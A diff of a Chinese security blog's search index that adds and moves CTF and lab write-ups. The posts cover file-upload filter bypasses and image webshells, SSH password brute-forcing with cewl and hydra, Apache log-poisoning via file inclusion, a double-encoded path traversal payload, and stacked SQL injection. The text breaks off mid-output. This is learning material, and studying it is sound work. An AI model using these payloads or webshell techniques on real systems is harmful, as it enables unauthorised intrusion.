-<h4 id="2-文件内容头检测"><a class="header-anchor" href="#2-文件内容头检测">¶</a>2.文件内容头检测</h4>
-<p>通过检测文件头内容判断上传文件的合法性</p>
-<p><a href="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924145404.png"><img src="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924145404.png" alt="img"></a></p>
-<p><strong>绕过方法：</strong></p>
-<p>在恶意脚本前加上允许上传文件的头标识(比如GIF89a，会解析成gif文件)</p>
-<h4 id="3-黑名单与白名单"><a class="header-anchor" href="#3-黑名单与白名单">¶</a>3.黑名单与白名单</h4>
-<p>通过判断后缀名来确定上传文件的合法性</p>
-<p><strong>黑名单绕过方法：</strong></p>
-<ol>
-<li>
-<p>大小写绕过，例如Php、PhP</p>
-</li>
-<li>
-<p>利用黑名单中没有的，但是又能够被解析的后缀名，例如php、 php3、 php4、php5、php7、pht、phtml、phps</p>
-</li>
-<li>
-<p>配合解析利用方法，将上传的文件当作php代码执行</p>
-</li>
-<li>
-<p>使用00截断(基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候)</p>
-<p><a href="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924142619.png"><img src="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924142619.png" alt="img"></a></p>
-</li>
-<li>
-<p>超长文件名截断上传(windows 258byte | linux 4096byte)</p>
-</li>
-</ol>
-<p><strong>白名单</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只允许上传指定后缀的文件，我们可以利用操作系统的特性来绕过。</span><br><span class="line">例如：上传文件名phpinfo.php(空格)</span><br><span class="line">                phpinfo.php(.)</span><br><span class="line">      最后生成文件时，字符会被自动去除。</span><br></pre></td></tr></table></figure>
-<p>白名单绕过方法不太好绕过，一般都是配合解析漏洞白名单</p>
-<h4 id="4-利用服务器特殊配置（Apache）"><a class="header-anchor" href="#4-利用服务器特殊配置（Apache）">¶</a>4.利用服务器特殊配置（Apache）</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果在Apache中.htaccess的配置有效，且可以被上传，那可以尝试在.htaccess中写入：</span><br><span class="line">   &lt;FilesMatch &quot;phpinfo.jpg&quot;&gt;</span><br><span class="line">   SetHandler application&#x2F;x-httpd-php</span><br><span class="line">   &lt;&#x2F;FilesMatch&gt;</span><br><span class="line">   还可以</span><br><span class="line">   AddType application&#x2F;x-httpd-php .ppp</span><br><span class="line">   这样 ppp后缀文件就会转换为php</span><br><span class="line">phpinfo.jpg即可以php脚本解析</span><br></pre></td></tr></table></figure>
-<h4 id="5-图片马"><a class="header-anchor" href="#5-图片马">¶</a>5.图片马</h4>
-<p>将图片和一句话在cmd下合成后，以php脚本执行时合成的一句话也会被执行</p>
-<p>当一句话被执行时，浏览器访问时看不到一句话代码</p>
-<p><strong>制作</strong><br>
-在cmd中输入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy a.jpg&#x2F;b+a.php shell.jpg</span><br></pre></td></tr></table></figure>
+<p><strong>声明:</strong></p>
+<p><strong>实验环境由合天网安实验室和蚁景网安提供</strong></p>
+<p><strong>服务器为私人服务器</strong></p>
+<h2 id="题目展示"><a class="header-anchor" href="#题目展示">¶</a>题目展示</h2>
+<p><strong>题目:强行突破</strong></p>
+<ul>
+<li>目标：139.155.49.43</li>
+<li>port：2222</li>
+<li>提示：<a href="https://www.hetianlab.com/">https://www.hetianlab.com/</a></li>
+<li>要求：获取/root/flag.txt内容进行提交</li>
+</ul>
+<p><strong>渗透核心是信息搜所以集先进行信息搜集</strong></p>
+<h2 id="1-nmap扫描"><a class="header-anchor" href="#1-nmap扫描">¶</a>1.nmap扫描</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A -p- 139.155.49.43</span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/haha13l4/article/details/89737637">nmap常用命令</a></p>
+<p>简单介绍以下</p>
+<ul>
+<li>-sT  Tcp连接</li>
+<li>-T 时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)   -T4第五个等级</li>
+<li>-A 综合扫描</li>
+</ul>
+<p>nmap扫描完发现能利用的端口只有ssh了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7e0b2620fac1036194909b0fb99187b4.png" alt="image-20201219193044690.png"></p>
+<h2 id="2-爬取ssh密码字典再利用hydra爆破"><a class="header-anchor" href="#2-爬取ssh密码字典再利用hydra爆破">¶</a>2.爬取ssh密码字典再利用hydra爆破</h2>
+<p><a href="https://bugku.com/mima/">密码字典生成器</a></p>
+<p>可以根据一些信息定制一些弱口令</p>
+<p>下面是两个fuzz字典</p>
+<p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
+<p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
+<p><strong>我们这里使用的是 Cewl 进行网站爬取字典,因为题目中提示了 <a href="https://www.hetianlab.com/">https://www.hetianlab.com/</a></strong></p>
+<p><strong>然后使用hydra进行爆破</strong></p>
+<p><a href="https://blog.csdn.net/systemino/article/details/90114610">cewl使用指南</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl -d 2 -m 5 -w word.txt https:&#x2F;&#x2F;www.hetianlab.com </span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b3489b25749a0ff3dae640ba89926425.png" alt="Snipaste_2020-12-19_20-05-47.png"></p>
+<p>打开字典 发现有很多但是有很多中文,所以使用正则删掉爬取到的中文</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2a3a20bb0fb598a37a885f3c3a630e22.png" alt="Snipaste_2020-12-19_20-06-50.png"></p>
+<p>双字节匹配<code>[^\x00-\xff]</code> 删除中文</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0cd012a9b95fd759df2a684344daa1bc.png" alt="Snipaste_2020-12-19_20-10-24.png"></p>
+<p>然后再   <code>\n</code> 匹配所有换行符并且删除就得到了正常的字典</p>
+<p>接下来使用hydra进行ssh爆破</p>
+<p><a href="https://www.cnblogs.com/xyz315/p/13072731.html">hydra常用命令</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l root -P word.txt 139.155.49.43 -s 2222 -f ssh</span><br></pre></td></tr></table></figure>
+<p>这里 用户用的是root，不知道用户名的可以使用 -L选择常见用户名的字典进行爆破</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d7cb91b1505635eeda98ccf7b263eb00.png" alt="Snipaste_2020-12-19_20-26-20.png"></p>
+<p>可以看到我们成功爆出了它服务器得到密码</p>
+<h2 id="3-远程登录获取flag"><a class="header-anchor" href="#3-远程登录获取flag">¶</a>3.远程登录获取flag</h2>
+<p>知道用户名和密码了，进行远程登录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@139.155.49.43 -p 2222</span><br></pre></td></tr></table></figure>
+<p>可以看到我们成功获得了flag</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/948663faf0d2c739bf0e27b9a1d861cb.png" alt="Snipaste_2020-12-19_20-32-36.png"></p>
 ]]></content>
       <categories>
-        <category>web技术学习</category>
-        <category>文件上传</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>文件日志包含漏洞</title>
-    <url>/2020/11/17/%E6%96%87%E4%BB%B6%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>本文针对ctf中文件日志包含小结</p>
-<a id="more"></a>
-<h2 id="日志包含漏洞原因："><a class="header-anchor" href="#日志包含漏洞原因：">¶</a><strong>日志包含漏洞原因</strong>：</h2>
-<p>某php文件存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含Apache(看服务器是Apache还是nginx)日志文件也可以获取WebShell</p>
-<p><strong>注意：需要开启服务器记录日志功能</strong></p>
-<p><strong>访问日志的位置和文件名在不同的系统上会有所差异</strong></p>
-<p>apache一般是/var/log/apache/access.log。：</p>
-<p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p>
-<p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 5615</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;style.css HTTP&#x2F;1.1&quot; 200 2415</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:29 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;img&#x2F;gifLogo.gif HTTP&#x2F;1.1&quot; 200 3525</span><br></pre></td></tr></table></figure>
-<p>当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/<?php phpinfo();?>。Apache会记录请求“<?php phpinfo();?>”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞</p>
-<p>但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问http://127.0.0.1/<?php phpinfo();?> 就能生成包含一句话木马的access.log文件</p>
-<p><strong>下面我们来本地演示(使用的是phpstudy的apache)</strong></p>
-<h2 id="复现漏洞："><a class="header-anchor" href="#复现漏洞：">¶</a>复现漏洞：</h2>
-<h3 id="1、文件包含漏洞代码"><a class="header-anchor" href="#1、文件包含漏洞代码">¶</a>1、文件包含漏洞代码</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;file inlcude test&#39;;</span><br><span class="line">if(isset($_GET[&#39;rj45&#39;]))&#123;</span><br><span class="line">	include($_GET[&#39;rj45&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2020111621455822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201116214608390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="2、写入phpinfo"><a class="header-anchor" href="#2、写入phpinfo">¶</a>2、写入phpinfo()</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214621531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201116214643118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="3、写入一句话"><a class="header-anchor" href="#3、写入一句话">¶</a>3、写入一句话</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214715741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/fd06194d9f48c8c4c862b2598da592d1.png" alt="img"></p>
-<h3 id="查看日志"><a class="header-anchor" href="#查看日志">¶</a>查看日志</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214751208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="相关ctf练习题"><a class="header-anchor" href="#相关ctf练习题">¶</a>相关ctf练习题</h2>
-<p><strong>ctfshow -web-4</strong></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>文件包含</category>
+        <category>渗透测试</category>
+        <category>ssh弱口令爆破</category>
       </categories>
   </entry>
   <entry>
@@ -2373,6 +2190,43 @@ index.php</p>
       <categories>
         <category>web技术学习</category>
         <category>命令执行</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>文件日志包含漏洞</title>
+    <url>/2020/11/17/%E6%96%87%E4%BB%B6%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>本文针对ctf中文件日志包含小结</p>
+<a id="more"></a>
+<h2 id="日志包含漏洞原因："><a class="header-anchor" href="#日志包含漏洞原因：">¶</a><strong>日志包含漏洞原因</strong>：</h2>
+<p>某php文件存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含Apache(看服务器是Apache还是nginx)日志文件也可以获取WebShell</p>
+<p><strong>注意：需要开启服务器记录日志功能</strong></p>
+<p><strong>访问日志的位置和文件名在不同的系统上会有所差异</strong></p>
+<p>apache一般是/var/log/apache/access.log。：</p>
+<p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p>
+<p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 5615</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;style.css HTTP&#x2F;1.1&quot; 200 2415</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:29 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;img&#x2F;gifLogo.gif HTTP&#x2F;1.1&quot; 200 3525</span><br></pre></td></tr></table></figure>
+<p>当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/<?php phpinfo();?>。Apache会记录请求“<?php phpinfo();?>”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞</p>
+<p>但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问http://127.0.0.1/<?php phpinfo();?> 就能生成包含一句话木马的access.log文件</p>
+<p><strong>下面我们来本地演示(使用的是phpstudy的apache)</strong></p>
+<h2 id="复现漏洞："><a class="header-anchor" href="#复现漏洞：">¶</a>复现漏洞：</h2>
+<h3 id="1、文件包含漏洞代码"><a class="header-anchor" href="#1、文件包含漏洞代码">¶</a>1、文件包含漏洞代码</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;file inlcude test&#39;;</span><br><span class="line">if(isset($_GET[&#39;rj45&#39;]))&#123;</span><br><span class="line">	include($_GET[&#39;rj45&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2020111621455822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201116214608390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="2、写入phpinfo"><a class="header-anchor" href="#2、写入phpinfo">¶</a>2、写入phpinfo()</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214621531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201116214643118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="3、写入一句话"><a class="header-anchor" href="#3、写入一句话">¶</a>3、写入一句话</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214715741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fd06194d9f48c8c4c862b2598da592d1.png" alt="img"></p>
+<h3 id="查看日志"><a class="header-anchor" href="#查看日志">¶</a>查看日志</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214751208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="相关ctf练习题"><a class="header-anchor" href="#相关ctf练习题">¶</a>相关ctf练习题</h2>
+<p><strong>ctfshow -web-4</strong></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>文件包含</category>
       </categories>
   </entry>
   <entry>
@@ -2441,6 +2295,223 @@ index.php</p>
       <categories>
         <category>前端</category>
         <category>docker</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Buuctf刷题记录</title>
+    <url>/2021/01/12/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0/</url>
+    <content><![CDATA[<h1>Buuctf刷题记录</h1>
+<h2 id="HCTF-2018-WarmUp"><a class="header-anchor" href="#HCTF-2018-WarmUp">¶</a>[HCTF]2018 WarmUp</h2>
+<p>要不是我脸皮厚 第一题就能把我劝退 🙂</p>
+<p>右键源代码得到提示</p>
+<p>访问source.php 得到源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>先根据提示的 hint.php 得到信息</p>
+<p><code>flag not here, and flag in ffffllllaaaagggg</code></p>
+<p>看看几个需要知道的函数</p>
+<p>1.mb_substr()</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114212509625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>2.mb_strpos</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114212747465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>先分析 emmm这个类</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class emmm</span><br><span class="line">&#123;</span><br><span class="line">    public static function checkFile(&amp;$page)</span><br><span class="line">    &#123;</span><br><span class="line">        $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;  &#x2F;&#x2F;page必须不为空或为字符串</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;  &#x2F;&#x2F;in_array()检测page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page &#x3D; mb_substr(  &#x2F;&#x2F;如果page含有?，则获取page第一个?前的值并赋给_page变量</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  &#x2F;&#x2F;检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page &#x3D; urldecode($page);  &#x2F;&#x2F;给_page二次赋值，使其等于URL解码之后的page</span><br><span class="line">        $_page &#x3D; mb_substr(&#x2F;&#x2F;得到hint(source).php</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)  &#x2F;&#x2F;如果_page有?，则截取_page(URL解码后的page)两个?中间的值</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  &#x2F;&#x2F;检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到函数代码中有四个if语句：</p>
+<p><em><strong>第一个if语句</strong></em> 对变量进行检验，要求$page为字符串，否则返回false <em>//因为返回False所以这里无用</em><br>
+<em><strong>第二个if语句</strong></em> 判断$page是否存在于$whitelist数组中，存在则返回true<br>
+<em><strong>第三个if语句</strong></em> 判断截取后的$page是否存在于$whitelist数组中，截取$page中’?'前部分，存在则返回true<br>
+<em><strong>第四个if语句</strong></em> 判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>
+若以上四个if语句均未返回值，则返回false</p>
+<p>有三个if语句可以返回true，第二个语句直接判断$page，不可用</p>
+<p>第三个语句截取’?'前部分，由于?被后部分被解析为get方式提交的参数，也不可利用</p>
+<p>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?'，仍可通过第四个if语句校验。</p>
+<p><strong>只要这四个if语句有一个为true即可包含file</strong>，关键点在_page 经过截断后返回true.</p>
+<p>所以我们的突破点就在于第四个if语句中，只要满足他的条件，我们就可以包含文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_page &#x3D; urldecode($page); </span><br><span class="line">$_page &#x3D; mb_substr(</span><br><span class="line">　　$_page,</span><br><span class="line">　　0,</span><br><span class="line">　　mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) &#x2F;&#x2F;得到hint(source).php的最后位置</span><br><span class="line">);if (in_array($_page, $whitelist)) &#123; </span><br><span class="line">　　return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里URL解码了一次$page值，这里需要注意的是，<em><strong>PHP中$_GET、$_POST、$_REQUEST这类函数在提取参数值时会URL解码一次</strong></em></p>
+<p>而这里在代码中又一次URL解码了一次，共计解码了两次，所以我们也需要对传入的值进行两次URL编码</p>
+<p>其次我们的突破点就在于这段代码只会截取?之前的字符串拿去和whitelist比对，因此只要确保?前的值是source.php或hint.php即可返回true</p>
+<p>等同于 /source.php?file=source.php%253Fxxxx 便可以使用include()函数包含 source.php?xxxx 这个文件(%253f是?URL编码两次后的值)</p>
+<p>所以可以构造Payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?file&#x3D;source.php%253F&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，这里之所以可以包含到ffffllllaaaagggg是因为PHP将 source.php%253F/ 视作了一个文件夹，然后 …/ 的用途是返回上级目录</p>
+<p>ffffllllaaaagggg位于根目录下，一般Web服务的文件夹在/var/www/html目录中，再加上source.php?/这个“文件夹”，所以我们总共需要…/四次来返回到根目录  当然你也可以用…/更多次 毕竟是在根目录</p>
+<p>参考:<a href="https://www.cnblogs.com/yesec/p/12635274.html">https://www.cnblogs.com/yesec/p/12635274.html</a></p>
+<h2 id="强网杯-2019随便注"><a class="header-anchor" href="#强网杯-2019随便注">¶</a>[强网杯]2019随便注</h2>
+<p>单引号试探</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114141920393.png" alt="在这里插入图片描述"></p>
+<p>然后 1’# 成功回显，发现并没有过滤注释符</p>
+<p><code>1'order by 2#</code>检测发现两个字段</p>
+<p>使用联合注入的时候发现大部分的注入方法都被过滤了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114141947895.png" alt="在这里插入图片描述"></p>
+<p>用sqlmap跑了一下得到库名: supersqli</p>
+<p>后面发现可以使用堆叠注入</p>
+<p>查出表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show tables from supersqli;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210114142009224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查字段名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from words;#</span><br></pre></td></tr></table></figure>
+<p>这个表好像没什么可以用的信息,有两个字段  id和data</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) 